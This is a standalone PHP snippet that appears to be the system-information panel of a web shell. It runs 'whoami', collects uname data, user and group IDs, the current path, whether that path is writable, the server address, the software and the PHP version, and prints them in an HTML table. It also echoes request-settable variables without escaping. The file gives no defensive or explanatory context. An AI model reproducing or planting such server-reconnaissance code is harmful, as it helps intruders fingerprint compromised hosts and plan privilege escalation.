<?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">

<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><span style="font-size: 9pt"><b>
		<?= $info ?>
      :</b> <?= $value ?></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">

	<span style="font-size: 9pt"><b>
    User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
  </TR>
  <TR>

  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
	<span style="font-size: 9pt"><b>
    Current Path:</b> <?= $chdir ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
	<span style="font-size: 9pt"><b>
    Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>

    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
	<span style="font-size: 9pt"><b>
    Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
    </span></DIV></TD>
  </TR>

  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
	<span style="font-size: 9pt"><b>
    Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">

	<span style="font-size: 9pt"><b>
    Script Current User:</b> <?= $user ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
	<span style="font-size: 9pt"><b>
    PHP Version:</b> <?= $ver ?></span></DIV></TD>

  </TR>
</TABLE>